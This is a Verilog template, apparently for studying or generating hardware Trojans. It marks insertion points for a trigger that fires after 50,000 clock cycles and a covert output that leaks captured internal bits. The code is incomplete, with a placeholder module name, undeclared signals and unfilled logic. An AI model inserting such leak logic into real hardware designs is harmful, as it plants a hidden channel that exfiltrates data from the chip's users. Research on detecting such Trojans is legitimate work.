// Trojan 3: info leakage

module <module_name> (
    input  wire         clk,
    input  wire         rst_n,
    // [Original I/Os]
    output wire         normal_out,
    // [Trojan insertion] - Low-activity output for info leak
    output wire         trojan_leak
);

    // [Original signals, regs, wires]
    reg [7:0] entropy_capture;
    reg [15:0] cnt_trojan_trigger;
    reg trigger_active;
    reg [2:0] leak_bits;
    reg leak_enable;

    // Normal logic
    // ...

    //-----------------------------------------
    // [Trojan insertion] Trigger logic
    //-----------------------------------------
    // The trigger activates when a rare sequence occurs (e.g., after 50_000 clock cycles)
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            cnt_trojan_trigger <= 16'd0;
            trigger_active     <= 1'b0;
        end else begin
            if (cnt_trojan_trigger == 16'd49999) begin
                trigger_active <= 1'b1;
            end else begin
                cnt_trojan_trigger <= cnt_trojan_trigger + 16'd1;
                trigger_active <= 1'b0;
            end
        end
    end

    //-----------------------------------------
    // [Trojan insertion] Entropy capture
    //-----------------------------------------
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            entropy_capture <= 8'd0;
        end else if (trigger_active) begin
            // Capture 8 bits of internal entropy (example: XOR of internal signals)
            entropy_capture <= {internal_signal_a[1:0] ^ internal_signal_b[3:2], 
                                internal_signal_c[7:4] ^ internal_signal_d[3:0]};
        end
    end

    //-----------------------------------------
    // [Trojan insertion] Leak control
    //-----------------------------------------
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            leak_enable <= 1'b0;
            leak_bits   <= 3'd0;
        end else if (trigger_active) begin
            leak_enable <= 1'b1;
            leak_bits <= entropy_capture[2:0]; // Leak 3 entropy bits
        end else begin
            leak_enable <= 1'b0;
            leak_bits   <= 3'd0;
        end
    end

    //-----------------------------------------
    // [Trojan insertion] Leak output logic
    //-----------------------------------------
    assign trojan_leak = (leak_enable) ? leak_bits[0] : 1'b0;

    // Existing functionality output assignments remain unaltered
    assign normal_out = /* unchanged logic */;


endmodule
